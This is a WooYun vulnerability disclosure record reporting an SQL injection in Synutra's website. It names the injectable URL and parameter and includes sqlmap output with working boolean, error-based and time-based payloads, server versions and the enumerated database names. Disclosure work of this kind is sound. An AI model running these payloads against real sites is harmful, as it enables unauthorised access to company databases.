{"id": 59411, "wybug_id": "wooyun-2013-047498", "wybug_title": "我国奶粉后台之圣元国际SQL注入", "wybug_corp": "圣元国际", "wybug_author": "caspar", "wybug_date": "2013-12-31 12:04", "wybug_open_date": "2014-02-14 12:05", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-31：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-02-14：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 圣元国际SQL注入 详细说明：  url:http://www.shengyuan.com/index.php/web_api/articleHDList/0key 是注入点\n发生了一个数据库错误Error Number: 1064You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' or article_body like '%11111'%')' at line 1select count(article_id) as total from shengyuan_article where showFlag='1' and (article_cat_id='7' or article_cat_id='8' or article_cat_id='11') and (article_title like '%11111'%' or article_body like '%11111'%')\n\nsqlmap identified the following injection points with a total of 222 HTTP(s) requests:---Place: POSTParameter: key    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: key=%E6%90%9C%E7%B4%A2%E8%B5%84%E8%AE%AF') RLIKE IF(1686=1686,0x254536253930253943254537254234254132254538254235253834254538254145254146,0x28) AND ('vKkM'='vKkM    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: key=%E6%90%9C%E7%B4%A2%E8%B5%84%E8%AE%AF') AND (SELECT 6775 FROM(SELECT COUNT(*),CONCAT(0x7178726e71,(SELECT (CASE WHEN (6775=6775) THEN 1 ELSE 0 END)),0x716a6d7271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('YVOF'='YVOF    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: key=-6802') OR 8062=SLEEP(5) AND ('dMCZ'='dMCZ---web server operating system: Windows or Linux CentOS or 7 5.8web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: key    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: key=%E6%90%9C%E7%B4%A2%E8%B5%84%E8%AE%AF') RLIKE IF(1686=1686,0x254536253930253943254537254234254132254538254235253834254538254145254146,0x28) AND ('vKkM'='vKkM    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: key=%E6%90%9C%E7%B4%A2%E8%B5%84%E8%AE%AF') AND (SELECT 6775 FROM(SELECT COUNT(*),CONCAT(0x7178726e71,(SELECT (CASE WHEN (6775=6775) THEN 1 ELSE 0 END)),0x716a6d7271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('YVOF'='YVOF    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: key=-6802') OR 8062=SLEEP(5) AND ('dMCZ'='dMCZ---web server operating system: Windows or Linux CentOS or 7 5.8web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5.0available databases [6]:[*] 2013mnpfc[*] 2013shengyuanTPF[*] information_schema[*] mysql[*] shengyuan[*] test\n   漏洞证明：  见详细说明   修复方案：  看看有回应嘛~   版权声明：转载请注明来源 caspar@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}